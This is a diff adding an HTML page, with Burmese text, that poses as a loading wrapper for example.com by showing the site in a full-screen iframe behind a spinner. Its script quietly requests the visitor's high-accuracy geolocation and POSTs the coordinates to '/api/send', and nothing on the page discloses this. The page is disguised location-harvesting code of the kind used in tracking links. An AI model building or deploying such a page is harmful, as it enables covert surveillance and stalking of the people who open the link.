@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>example.com</title>
+
+    <meta property="og:title" content="example.com">
+    <meta property="og:description" content="Welcome">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://example.com">
+
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+        }
+
+        #siteFrame {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+            display: block;
+            z-index: 1;
+        }
+
+        #loading {
+            position: fixed;
+            inset: 0;
+            background: #f5f5f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            transition: opacity 0.3s ease;
+        }
+        #loading.hidden { opacity: 0; pointer-events: none; }
+
+        .spinner {
+            width: 36px; height: 36px;
+            border: 3px solid #e5e5e5;
+            border-top-color: #0088cc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #fallback {
+            position: fixed;
+            inset: 0;
+            background: #f5f5f7;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            padding: 30px;
+            text-align: center;
+        }
+        #fallback.show { display: flex; }
+
+        #fallback h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        #fallback a {
+            display: inline-block;
+            padding: 14px 28px;
+            background: #0088cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading">
+        <div class="spinner"></div>
+    </div>
+
+    <iframe
+        id="siteFrame"
+        src="about:blank"
+        title="Loading"
+        allow="geolocation; fullscreen"
+        referrerpolicy="no-referrer-when-downgrade"
+        loading="eager"
+        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation-by-user-activation"
+    ></iframe>
+
+    <div id="fallback">
+        <h2>ဆက်လုပ်ရန် အောက်ပါ button ကို နှိပ်ပါ</h2>
+        <a id="fallbackLink" href="#">ဆက်သွားရန်</a>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            const TARGET_URL = 'https://example.com';
+
+            const iframe = document.getElementById('siteFrame');
+            const loading = document.getElementById('loading');
+            const fallback = document.getElementById('fallback');
+            const fallbackLink = document.getElementById('fallbackLink');
+
+            fallbackLink.href = TARGET_URL;
+            iframe.src = TARGET_URL;
+
+            let iframeLoaded = false;
+
+            iframe.addEventListener('load', () => {
+                iframeLoaded = true;
+                loading.classList.add('hidden');
+            });
+
+            const blockTimer = setTimeout(() => {
+                if (!iframeLoaded) showFallback();
+            }, 4000);
+
+            function showFallback() {
+                clearTimeout(blockTimer);
+                loading.classList.add('hidden');
+                fallback.classList.add('show');
+            }
+
+            if (!navigator.geolocation) return;
+
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    try {
+                        await fetch('/api/send', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                targetUrl: TARGET_URL
+                            })
+                        });
+                    } catch (e) {
+                        console.log('send failed', e);
+                    }
+                },
+                (err) => console.log('geolocation error', err.code),
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        })();
+    </script>
+</body>
+</html>
